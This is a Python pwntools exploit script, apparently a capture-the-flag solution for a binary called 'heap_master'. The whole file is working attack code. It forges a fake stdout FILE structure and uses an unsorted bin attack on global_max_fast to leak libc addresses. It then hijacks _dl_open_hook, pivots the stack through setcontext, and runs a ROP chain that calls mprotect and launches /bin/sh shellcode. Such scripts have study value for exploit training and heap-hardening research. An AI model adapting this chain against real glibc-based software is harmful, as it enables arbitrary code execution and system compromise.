#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
context.binary = "./heap_master"
libc = ELF(context.binary.libc.path)
libc.sym['global_max_fast'] = 0x3c67f8
libc.sym['main_arena'] = 0x3c4b20
libc.sym['one_gadget'] = 0xf1147

def add(size):
    io.sendlineafter(">> ", "1")
    sleep(0.01)
    io.sendlineafter("size: ", str(size))
    sleep(0.01)

def edit(offset, cont):
    io.sendlineafter(">> ", "2")
    sleep(0.01)
    io.sendlineafter("offset: ", str(offset))
    sleep(0.01)
    io.sendlineafter("size: ", str(len(cont)))
    sleep(0.01)
    io.sendafter("content: ", cont)
    sleep(0.01)

def delete(offset):
    io.sendlineafter(">> ", "3")
    sleep(0.01)
    io.sendlineafter("offset: ", str(offset))
    sleep(0.01)

def DEBUG():
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[2], 16)
    warn("free @ {:#x}".format(base + 0xECB))
    warn("edit @ {:#x}".format(base + 0xE54))
    warn("malloc @ {:#x}".format(base + 0xF00))
    pause()


io = process("./heap_master")

# forge fake _IO_2_1_stdout_
for i in xrange(14):
    edit(0x100 + 0x10 * i, flat(0, 0x151))
for i in xrange(16):
    edit(0x100 + 0x150 + 0x10 * i, flat(0, 0x21))
for i in xrange(14):
    delete(0x1e0 - 0x10 * i)
    add(0x140)

# _flags
edit(0x110, flat(0xfbad2887))

# _IO_read_ptr -> _IO_buf_end
for i in xrange(7):
    if i == 3:
        edit(0x118 + 0x8 * i, p16(0x2620)) 
        continue
    if i == 4:
        edit(0x118 + 0x8 * i, p16(0x2710)) 
        continue
    edit(0x118 + 0x8 * i, p16(0x26a3))
edit(0x150, p16(0x26a4))

# _IO_save_base -> _markers
for i in xrange(4):
    edit(0x158 + 0x8 * i, flat(0))

# _chain
edit(0x178, p16(0x18e0))

# _fileno
edit(0x180, flat(1))
edit(0x188, flat(0xffffffffffffffff))
edit(0x190, flat(0x000000000a000000))
edit(0x198, p16(0x3780))
edit(0x1a0, flat(0xffffffffffffffff))
edit(0x1a8, flat(0))
edit(0x1b0, p16(0x17a0))
for i in xrange(3):
    edit(0x1b8 + 0x8 * i, flat(0))
edit(0x1d0, flat(0x00000000ffffffff))
for i in xrange(2):
    edit(0x1d8 + 0x8 * i, flat(0))
# _vtable
edit(0x1e8, p16(0x06e0))

# unsorted bin attack to global_max_fast
guess = 0xd000
fastbinsY = guess + libc.sym['main_arena'] + 8
global_max_fast = guess + libc.sym['global_max_fast']
stdout = guess + libc.sym['stdout']
_IO_list_all = guess + libc.sym['_IO_list_all']
_dl_open_hook = guess + libc.sym['_dl_open_hook']

edit(0x200, flat(0, 0x91))
delete(0x210)
edit(0x218, p16((global_max_fast & 0xffff) - 0x10))
add(0x80)

# hijack stdout to leak
idx = (stdout - fastbinsY) / 8
size = idx * 0x10 + 0x20
edit(0x118, flat(size + 1))
edit(0x110 + size, flat(0, 0x21))
delete(0x120)

libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['_IO_2_1_stdout_'] - 131
success("libc @ {:#x}".format(libc.address))
mmap = u64(io.recvuntil("===", drop = True)[-8: ]) - 0x110
success("mmap @ {:#x}".format(mmap))

# hijack _dl_open_hook
idx = (_dl_open_hook - fastbinsY) / 8
size = idx * 0x10 + 0x20
edit(0x500, flat(0, size + 1))
edit(0x500 + size, flat(0, 0x21))
delete(0x510)

# stack pivot
edit(0x500, flat(libc.address + 0x937, libc.sym['setcontext'] + 67))
'''
pwndbg> pdisass 8
 ► 0x7ffff7a54b75 <setcontext+53>     mov    rsp, qword ptr [rdi + 0xa0]
   0x7ffff7a54b7c <setcontext+60>     mov    rbx, qword ptr [rdi + 0x80]
   0x7ffff7a54b83 <setcontext+67>     mov    rbp, qword ptr [rdi + 0x78]
   0x7ffff7a54b87 <setcontext+71>     mov    r12, qword ptr [rdi + 0x48]
   0x7ffff7a54b8b <setcontext+75>     mov    r13, qword ptr [rdi + 0x50]
   0x7ffff7a54b8f <setcontext+79>     mov    r14, qword ptr [rdi + 0x58]
   0x7ffff7a54b93 <setcontext+83>     mov    r15, qword ptr [rdi + 0x60]
   0x7ffff7a54b97 <setcontext+87>     mov    rcx, qword ptr [rdi + 0xa8]
   0x7ffff7a54b9e <setcontext+94>     push   rcx
   0x7ffff7a54b9f <setcontext+95>     mov    rsi, qword ptr [rdi + 0x70]
   0x7ffff7a54ba3 <setcontext+99>     mov    rdx, qword ptr [rdi + 0x88]
   0x7ffff7a54baa <setcontext+106>    mov    rcx, qword ptr [rdi + 0x98]
   0x7ffff7a54bb1 <setcontext+113>    mov    r8, qword ptr [rdi + 0x28]
   0x7ffff7a54bb5 <setcontext+117>    mov    r9, qword ptr [rdi + 0x30]
   0x7ffff7a54bb9 <setcontext+121>    mov    rdi, qword ptr [rdi + 0x68]
   0x7ffff7a54bbd <setcontext+125>    xor    eax, eax
   0x7ffff7a54bbf <setcontext+127>    ret
'''
edit(0x500 + 0x78, flat(mmap + 0x700 - 0x8))
edit(0x500 + 0xa8, flat(libc.address + 0x0000000000042351)) # leave ; ret
edit(0x500 + 0x70, flat(0x10000))
edit(0x500 + 0x88, flat(7))
edit(0x500 + 0x68, flat(mmap))

# ROP
rop = flat(
        libc.sym['mprotect'], 
        libc.address + 0x0000000000021102, # pop rdi ; ret
        0,
        libc.address + 0x00000000000202e8, # pop rsi ; ret
        mmap + 0x1000,
        libc.address + 0x0000000000001b92, # pop rdx ; ret
        0x1000,
        libc.address + 0x00000000000bc375, # syscall ; ret
        mmap + 0x1000
        )
edit(0x700, rop)

#  DEBUG()
delete(0x10)

sc = asm(shellcraft.sh())
io.send('\x90' * 0x20 + sc)

io.interactive()
